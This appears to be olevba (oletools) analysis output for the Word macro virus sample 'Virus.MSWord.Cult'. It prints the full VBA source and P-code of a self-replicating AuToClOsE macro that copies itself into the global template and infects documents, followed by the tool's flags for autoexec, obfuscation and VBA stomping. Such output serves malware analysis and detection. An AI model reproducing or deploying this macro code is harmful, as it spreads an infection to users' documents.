olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cult
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cult - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AuToClOsE.bas 
in file: Virus.MSWord.Cult - OLE stream: 'Macros/VBA/AuToClOsE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Function Name1$(h$)
Dim a$
Dim x
Dim i
Dim l
Dim d$
Dim e$
Dim z
Dim AA$
Dim y
Dim k$
Dim CC$
a$ = WordBasic.[MenuText$](0, 1, 0)
x = Len(a$) + 1: i = 1: l = 1
Again:
If i = x Then GoTo GOON
d$ = Mid(a$, i, 1)
If d$ = Chr(38) Or d$ = Chr(46) Or d$ = Chr(32) Then
    i = i + 1
    GoTo Again
Else
    e$ = e$ + d$
    i = i + 1
    GoTo Again
End If
GOON:
z = Len(e$) + 1
AA$ = WordBasic.[MenuItemText$](e$, 0, 1, 0)
y = Len(AA$) + 1
Again2:
If l = y Then GoTo Finish
k$ = Mid(AA$, l, 1)
If k$ = "&" Or k$ = Chr(46) Or k$ = Chr(32) Or k$ = "-" Or k$ = "/" Then
    l = l + 1
    GoTo Again2
Else
    CC$ = CC$ + k$
    l = l + 1
    GoTo Again2
End If
Finish:
h$ = WordBasic.[Left$](CC$, z)
Name1$ = e$ + h$
End Function

Private Function Name2$(h$)
Dim a$
Dim x
Dim i
Dim l
Dim d$
Dim e$
Dim z
Dim AA$
Dim y
Dim k$
Dim CC$
a$ = WordBasic.[MenuText$](0, 1, 0)
x = Len(a$) + 1: i = 1: l = 1
Again:
If i = x Then GoTo GOON
d$ = Mid(a$, i, 1)
If d$ = Chr(38) Or d$ = Chr(46) Or d$ = Chr(32) Then
    i = i + 1
    GoTo Again
Else
    e$ = e$ + d$
    i = i + 1
    GoTo Again
End If
GOON:
z = Len(e$) + 1
AA$ = WordBasic.[MenuItemText$](e$, 0, 2, 0)
y = Len(AA$) + 1
Again2:
If l = y Then GoTo Finish
k$ = Mid(AA$, l, 1)
If k$ = "&" Or k$ = Chr(46) Or k$ = Chr(32) Or k$ = "-" Or k$ = "/" Then
    l = l + 1
    GoTo Again2
Else
    CC$ = CC$ + k$
    l = l + 1
    GoTo Again2
End If
Finish:
h$ = WordBasic.[Left$](CC$, z)
Name2$ = e$ + h$
End Function

Public Sub MAIN()
Dim o
Dim k
Dim m$
Dim h$
Dim n$
If WordBasic.CountMacros(0) > 0 Then
For o = 1 To WordBasic.CountMacros(0)
If WordBasic.[MacroName$](o, 0) = "cULT" Then
    k = 1
End If
Next o
If k = 1 Then
    GoTo Finish
Else
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AuToClOsE", "Global:cULT"
    WordBasic.ScreenUpdating
    m$ = Name1$(h$): n$ = Name2$(h$)
    WordBasic.ToolsMacro Name:=m$, Show:=1, Edit:=1
    InsertCode
    WordBasic.ToolsMacro Name:=n$, Show:=1, Edit:=1
    InsertCode
    WordBasic.FileSaveAll 1, 1
    WordBasic.ScreenUpdating
End If
Finish:

Rem CULT! Nightmare Joker (SLAM)

End If
End Sub

Private Sub InsertCode()
WordBasic.StartOfDocument
WordBasic.LineDown 1
WordBasic.CharRight 10
WordBasic.Insert Chr(32)
WordBasic.StartOfDocument
WordBasic.LineDown 4
WordBasic.EndOfLine
WordBasic.InsertPara
WordBasic.Insert "cULT.DoIt"
WordBasic.DocClose 1
End Sub

Private Sub DoIt()
Dim o
Dim Infect
On Error GoTo -1: On Error GoTo Finish
If WordBasic.CountMacros(1) > 0 Then
For o = 1 To WordBasic.CountMacros(1)
    If WordBasic.[MacroName$](o, 1) = "AuToClOsE" Then
            Infect = 1
    End If
Next o
End If
If Infect = 0 Then
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:cULT", WordBasic.[WindowName$]() + ":AuToClOsE"
WordBasic.FileSaveAll 1, 1
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cult
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 979 bytes
' Line #0:
' Macros/VBA/AuToClOsE - 7824 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Function Name1(h))
' Line #2:
' 	Dim 
' 	VarDefn a
' Line #3:
' 	Dim 
' 	VarDefn x
' Line #4:
' 	Dim 
' 	VarDefn i
' Line #5:
' 	Dim 
' 	VarDefn l
' Line #6:
' 	Dim 
' 	VarDefn d
' Line #7:
' 	Dim 
' 	VarDefn e
' Line #8:
' 	Dim 
' 	VarDefn z
' Line #9:
' 	Dim 
' 	VarDefn AA
' Line #10:
' 	Dim 
' 	VarDefn y
' Line #11:
' 	Dim 
' 	VarDefn k
' Line #12:
' 	Dim 
' 	VarDefn CC
' Line #13:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuText$] 0x0003 
' 	St a$ 
' Line #14:
' 	Ld a$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St i 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St l 
' Line #15:
' 	Label Again 
' Line #16:
' 	Ld i 
' 	Ld x 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo GOON 
' 	EndIf 
' Line #17:
' 	Ld a$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St d$ 
' Line #18:
' 	Ld d$ 
' 	LitDI2 0x0026 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Ld d$ 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Or 
' 	Ld d$ 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #19:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #20:
' 	GoTo Again 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	Ld e$ 
' 	Ld d$ 
' 	Add 
' 	St e$ 
' Line #23:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #24:
' 	GoTo Again 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Label GOON 
' Line #27:
' 	Ld e$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St z 
' Line #28:
' 	Ld e$ 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemText$] 0x0004 
' 	St AA$ 
' Line #29:
' 	Ld AA$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' Line #30:
' 	Label Again2 
' Line #31:
' 	Ld l 
' 	Ld y 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Finish 
' 	EndIf 
' Line #32:
' 	Ld AA$ 
' 	Ld l 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St k$ 
' Line #33:
' 	Ld k$ 
' 	LitStr 0x0001 "&"
' 	Eq 
' 	Ld k$ 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Or 
' 	Ld k$ 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Or 
' 	Ld k$ 
' 	LitStr 0x0001 "-"
' 	Eq 
' 	Or 
' 	Ld k$ 
' 	LitStr 0x0001 "/"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #34:
' 	Ld l 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #35:
' 	GoTo Again2 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	Ld CC$ 
' 	Ld k$ 
' 	Add 
' 	St CC$ 
' Line #38:
' 	Ld l 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #39:
' 	GoTo Again2 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Label Finish 
' Line #42:
' 	Ld CC$ 
' 	Ld z 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St h$ 
' Line #43:
' 	Ld e$ 
' 	Ld h$ 
' 	Add 
' 	St Name1$ 
' Line #44:
' 	EndFunc 
' Line #45:
' Line #46:
' 	FuncDefn (Private Function Name2(h))
' Line #47:
' 	Dim 
' 	VarDefn a
' Line #48:
' 	Dim 
' 	VarDefn x
' Line #49:
' 	Dim 
' 	VarDefn i
' Line #50:
' 	Dim 
' 	VarDefn l
' Line #51:
' 	Dim 
' 	VarDefn d
' Line #52:
' 	Dim 
' 	VarDefn e
' Line #53:
' 	Dim 
' 	VarDefn z
' Line #54:
' 	Dim 
' 	VarDefn AA
' Line #55:
' 	Dim 
' 	VarDefn y
' Line #56:
' 	Dim 
' 	VarDefn k
' Line #57:
' 	Dim 
' 	VarDefn CC
' Line #58:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuText$] 0x0003 
' 	St a$ 
' Line #59:
' 	Ld a$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St i 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St l 
' Line #60:
' 	Label Again 
' Line #61:
' 	Ld i 
' 	Ld x 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo GOON 
' 	EndIf 
' Line #62:
' 	Ld a$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St d$ 
' Line #63:
' 	Ld d$ 
' 	LitDI2 0x0026 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Ld d$ 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Or 
' 	Ld d$ 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #64:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #65:
' 	GoTo Again 
' Line #66:
' 	ElseBlock 
' Line #67:
' 	Ld e$ 
' 	Ld d$ 
' 	Add 
' 	St e$ 
' Line #68:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #69:
' 	GoTo Again 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	Label GOON 
' Line #72:
' 	Ld e$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St z 
' Line #73:
' 	Ld e$ 
' 	LitDI2 0x0000 
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MenuItemText$] 0x0004 
' 	St AA$ 
' Line #74:
' 	Ld AA$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' Line #75:
' 	Label Again2 
' Line #76:
' 	Ld l 
' 	Ld y 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Finish 
' 	EndIf 
' Line #77:
' 	Ld AA$ 
' 	Ld l 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St k$ 
' Line #78:
' 	Ld k$ 
' 	LitStr 0x0001 "&"
' 	Eq 
' 	Ld k$ 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Or 
' 	Ld k$ 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Or 
' 	Ld k$ 
' 	LitStr 0x0001 "-"
' 	Eq 
' 	Or 
' 	Ld k$ 
' 	LitStr 0x0001 "/"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #79:
' 	Ld l 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #80:
' 	GoTo Again2 
' Line #81:
' 	ElseBlock 
' Line #82:
' 	Ld CC$ 
' 	Ld k$ 
' 	Add 
' 	St CC$ 
' Line #83:
' 	Ld l 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #84:
' 	GoTo Again2 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	Label Finish 
' Line #87:
' 	Ld CC$ 
' 	Ld z 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	St h$ 
' Line #88:
' 	Ld e$ 
' 	Ld h$ 
' 	Add 
' 	St Name2$ 
' Line #89:
' 	EndFunc 
' Line #90:
' Line #91:
' 	FuncDefn (Public Sub MAIN())
' Line #92:
' 	Dim 
' 	VarDefn o
' Line #93:
' 	Dim 
' 	VarDefn k
' Line #94:
' 	Dim 
' 	VarDefn m
' Line #95:
' 	Dim 
' 	VarDefn h
' Line #96:
' 	Dim 
' 	VarDefn n
' Line #97:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #98:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #99:
' 	Ld o 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0004 "cULT"
' 	Eq 
' 	IfBlock 
' Line #100:
' 	LitDI2 0x0001 
' 	St k 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #104:
' 	GoTo Finish 
' Line #105:
' 	ElseBlock 
' Line #106:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":AuToClOsE"
' 	Add 
' 	LitStr 0x000B "Global:cULT"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #107:
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0000 
' Line #108:
' 	Ld h$ 
' 	ArgsLd Name1$ 0x0001 
' 	St m$ 
' 	BoS 0x0000 
' 	Ld h$ 
' 	ArgsLd Name2$ 0x0001 
' 	St n$ 
' Line #109:
' 	Ld m$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Edit 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #110:
' 	ArgsCall InsertCode 0x0000 
' Line #111:
' 	Ld n$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Edit 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #112:
' 	ArgsCall InsertCode 0x0000 
' Line #113:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #114:
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0000 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	Label Finish 
' Line #117:
' Line #118:
' 	Rem 0x001D " CULT! Nightmare Joker (SLAM)"
' Line #119:
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	EndSub 
' Line #122:
' Line #123:
' 	FuncDefn (Private Sub InsertCode())
' Line #124:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #125:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall LineDown 0x0001 
' Line #126:
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemCall CharRight 0x0001 
' Line #127:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #128:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #129:
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemCall LineDown 0x0001 
' Line #130:
' 	Ld WordBasic 
' 	ArgsMemCall EndOfLine 0x0000 
' Line #131:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #132:
' 	LitStr 0x0009 "cULT.DoIt"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #133:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0001 
' Line #134:
' 	EndSub 
' Line #135:
' Line #136:
' 	FuncDefn (Private Sub DoIt())
' Line #137:
' 	Dim 
' 	VarDefn o
' Line #138:
' 	Dim 
' 	VarDefn Infect
' Line #139:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Finish 
' Line #140:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #141:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #142:
' 	Ld o 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0009 "AuToClOsE"
' 	Eq 
' 	IfBlock 
' Line #143:
' 	LitDI2 0x0001 
' 	St Infect 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	Ld Infect 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #148:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #149:
' 	LitStr 0x000B "Global:cULT"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":AuToClOsE"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #150:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AuToClOsE           |Runs when the Word document is closed        |
|Suspicious|DoIt                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

